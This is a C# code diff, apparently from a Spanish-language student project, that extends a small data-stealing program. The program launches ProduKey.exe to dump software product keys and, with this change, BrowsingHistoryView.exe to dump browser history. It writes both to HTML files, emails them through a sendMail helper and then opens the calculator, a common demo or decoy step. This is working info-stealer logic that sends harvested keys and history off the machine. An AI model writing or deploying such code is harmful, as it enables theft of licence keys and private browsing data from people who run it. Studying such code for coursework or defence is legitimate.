@@ -17,6 +17,7 @@ namespace TP
             List<string> files = new List<string>();
 
             files.Add(Helpers.openProduKey());
+            files.Add(Helpers.openBrowsingHistoryView());
 
             Helpers.sendMail("Prueba", "Estoy probando", files);
             Helpers.openCalc();
@@ -32,10 +33,20 @@ namespace TP
 
         public static string openProduKey()
         {
-            string file = "hola.txt";
+            string file = "produKey.html";
             ProcessStartInfo startInfo = new ProcessStartInfo();
             startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ProduKey.exe");
-            startInfo.Arguments = @"/stext " + file;
+            startInfo.Arguments = @"/shtml " + file;
+            Process.Start(startInfo);
+            return file;
+        }
+
+        public static string openBrowsingHistoryView()
+        {
+            string file = "browsingHistoryView.html";
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "BrowsingHistoryView.exe");
+            startInfo.Arguments = @"/shtml " + file;
             Process.Start(startInfo);
             return file;
         }
